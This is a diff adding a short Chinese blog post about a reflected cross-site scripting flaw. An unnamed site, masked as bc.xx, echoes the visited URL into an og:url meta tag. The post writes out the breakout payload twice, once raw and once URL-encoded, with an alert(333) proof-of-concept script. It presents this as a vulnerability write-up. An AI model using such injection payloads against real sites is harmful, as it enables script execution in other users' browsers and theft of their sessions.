@@ -1,0 +1,23 @@
+<p>结论：</p>
+<p>可以用这个方法：</p>
+<p> &lt;meta property="og:url" content="https://bc.xx/de/i-6i0ji01r-n/;1')"--&gt;</p>
+<p>&lt;script unsafe-inline&gt;window.onload = function() {alert(333)};&lt;/script&gt;</p>
+<p>&lt;!--" /&gt;</p>
+<p>该方法可以运行script 的内容</p>
+<p>某站点，有个邀请链接，形如：</p>
+<p><a href="https://bc.xx/de/i-6i0ji01r-n/; " target="_blank">https://bc.xx/de/i-6i0ji01r-n/</a>
+</p>
+<p>通过观察（我也不知道咋观察的）发现在存在一个meta标签，看起来形如：</p>
+<p>&lt;meta property='og:url'&#160; content='https://bc.xx/de/i-6i0ji01r-n' /&gt;&#160; 也就是说，会把用户访问的URL回显在这里。</p>
+<p>所以就可以构造 payload: </p>
+<p><a href="https://bc.xx/de/i-6i0ji01r-n/;1" target="_blank">https://bc.xx/de/i-6i0ji01r-n/;1')%22--%3E%3Cscript%20unsafe-inline%3Ewindow.onload%20=%20function()%20%7Balert(333)%7D;%3C/script%3E%3C!--?p=FUZZ&amp;utm_source=7v820mt6</a>
+</p>
+<p>看起来是这样：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20240621_094100.png" /></p>
+<p>运行起来是这样：</p>
+<p><img src="https://files.sweetysoft.com/blog_images/from_paste_20240621_094258.png" /></p>
+<p>也就是说，这个HTML标签，看起来不合法，但是可以在几乎所有主流浏览器中运行：(firefox, chrome, edge)</p>
+<p> &lt;meta property="og:url" content="https://bc.xx/de/i-6i0ji01r-n/;1')"--&gt;&lt;script unsafe-inline&gt;window.onload = function() {alert(333)};&lt;/script&gt;&lt;!--" /&gt;</p>
+<p>这个script会运行, 下面的 &lt;p&gt; 则不会运行</p>
+<p> &lt;p&gt;hihihi&lt;/p&gt;&#160; </p>
+
